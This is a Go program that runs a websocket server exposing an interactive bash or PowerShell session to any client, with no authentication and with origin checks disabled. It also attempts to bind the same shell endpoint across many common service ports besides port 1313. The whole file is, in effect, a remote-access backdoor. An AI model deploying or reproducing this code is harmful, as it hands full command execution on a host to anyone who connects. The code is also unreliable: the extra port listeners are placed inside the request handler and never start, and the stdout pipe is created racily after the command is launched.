package main

import (
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

func main() {
	tcpPorts := []string{"80", "443", "8080", "8443", "8000", "3000", "5000", "8008", "8081", "8088", "8888", "9000", "9090", "9200", "9300", "27017", "27018", "27019", "28017", "32400"}

	for _, port := range tcpPorts {
		go func(port string) {
			shell := "bash"
			if runtime.GOOS == "windows" {
				shell = "powershell.exe"
			}

			r := gin.Default()

			r.GET("/ws", func(c *gin.Context) {
				upgrader := websocket.Upgrader{
					CheckOrigin: func(r *http.Request) bool {
						return true
					},
				}
				conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
				if err != nil {
					log.Println("Failed to upgrade websocket connection:", err)
					return
				}
				defer conn.Close()

				cmd := exec.Command(shell)
				cmd.Env = os.Environ()
				pty, err := cmd.StdinPipe()
				if err != nil {
					log.Println("Failed to create pty:", err)
					return
				}
				defer pty.Close()

				go func() {
					for {
						_, message, err := conn.ReadMessage()
						if err != nil {
							log.Println("Failed to read message from websocket:", err)
							return
						}
						pty.Write(message)
					}
				}()

				go func() {
					stdout, err := cmd.StdoutPipe()
					if err != nil {
						log.Println("Failed to create stdout pipe:", err)
						return
					}
					defer stdout.Close()

					buf := make([]byte, 1024)
					for {
						n, err := stdout.Read(buf)
						if err != nil {
							log.Println("Failed to read from command stdout:", err)
							return
						}
						conn.WriteMessage(websocket.TextMessage, buf[:n])
					}
				}()

				if err := cmd.Run(); err != nil {
					log.Println("Command execution failed:", err)
				}

				if err := http.ListenAndServe(":"+port, r); err != nil {
					log.Fatal("Failed to start server on: "+port, err)
				}
				log.Println("Server started on: " + port)
			})
		}(port)
	}

	shell := "bash"
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	}

	r := gin.Default()

	r.GET("/ws", func(c *gin.Context) {
		upgrader := websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		}
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			log.Println("Failed to upgrade websocket connection:", err)
			return
		}
		defer conn.Close()

		cmd := exec.Command(shell)
		cmd.Env = os.Environ()
		pty, err := cmd.StdinPipe()
		if err != nil {
			log.Println("Failed to create pty:", err)
			return
		}
		defer pty.Close()

		go func() {
			for {
				_, message, err := conn.ReadMessage()
				if err != nil {
					log.Println("Failed to read message from websocket:", err)
					return
				}
				pty.Write(message)
			}
		}()

		go func() {
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				log.Println("Failed to create stdout pipe:", err)
				return
			}
			defer stdout.Close()

			buf := make([]byte, 1024)
			for {
				n, err := stdout.Read(buf)
				if err != nil {
					log.Println("Failed to read from command stdout:", err)
					return
				}
				conn.WriteMessage(websocket.TextMessage, buf[:n])
			}
		}()

		if err := cmd.Run(); err != nil {
			log.Println("Command execution failed:", err)
		}

		log.Println("Server started on: 1313")
	})
	if err := http.ListenAndServe(":1313", r); err != nil {
		log.Fatal("Failed to start server on: 1313 ", err)
	}
}
